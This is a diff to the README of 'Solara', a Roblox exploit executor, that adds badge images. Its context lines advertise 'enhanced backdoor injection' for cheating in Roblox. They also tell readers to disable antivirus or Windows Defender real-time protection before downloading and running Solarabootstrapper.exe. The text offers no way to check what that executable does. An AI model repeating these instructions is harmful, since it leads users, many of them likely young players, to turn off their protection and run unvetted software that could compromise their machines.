@@ -15,7 +15,8 @@ Solara is a powerful Roblox exploit developed by expert programmers since 2023. 
 - **Free Level 3 Executor**: Access advanced features of the Solara Executor completely free of charge.
 
 ## Features!
-[![Version](https://img.shields.io/badge/featuring-blue.svg?maxAge=259200)]()
+[![Version](https://img.shields.io/badge/Presenting-darkgreen.svg?maxAge=259200)]()
+
 - Bug fixes.
 - Improved bootstrapper.
 - Enhanced backdoor injection.
@@ -32,7 +33,10 @@ Solara is constantly evolving with regular updates, ensuring our users have acce
 
  Stay tuned as we continue to innovate and refine Solara to meet your evolving needs in Roblox exploting.
 
+[![Version](https://img.shields.io/badge/StayTuned!-yellow.svg?maxAge=259200)]()
+
 ## HOW TO RUN ON WINDOWS
+[![Version](https://img.shields.io/badge/Guidance-darkblue.svg?maxAge=259200)]()
 
 First, download the zip file. Next, temporarily disable your antivirus software or the real-time protection feature in Windows Defender to avoid any potential interference.
 
@@ -56,6 +60,7 @@ Once extracted, navigate to the files and double-click on Solarabootstrapper.exe
 Take a look at the source code for more details.
 
 ## Contributions to Solara:
+[![Version](https://img.shields.io/badge/Contributers-yellow.svg?maxAge=259200)]()
 
 We greatly appreciate the ongoing contributions from our dedicated community, which continue to enrich and enhance Solara's capabilities for Roblox exploiters worldwide.
 
